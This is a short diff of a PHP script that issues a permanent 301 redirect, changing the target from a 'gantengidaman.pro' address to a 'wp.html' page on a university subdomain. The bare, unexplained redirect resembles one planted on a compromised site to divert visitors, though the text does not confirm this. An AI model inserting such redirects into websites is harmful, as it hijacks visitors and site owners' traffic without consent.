@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.gantengidaman.pro/", true, 301);
+header("Location: https://isfm.faperika.unri.ac.id/wp.html", true, 301);
 exit();
 ?>
